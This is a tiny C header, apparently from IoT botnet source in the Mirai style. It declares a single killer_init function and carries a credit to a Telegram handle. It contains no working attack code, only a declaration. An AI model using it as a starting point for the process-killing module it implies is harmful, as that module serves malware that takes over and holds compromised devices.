// by juan @ipmiv2 on telegram

#ifndef KILLER_H
#define KILLER_H

void killer_init(void);

#endif
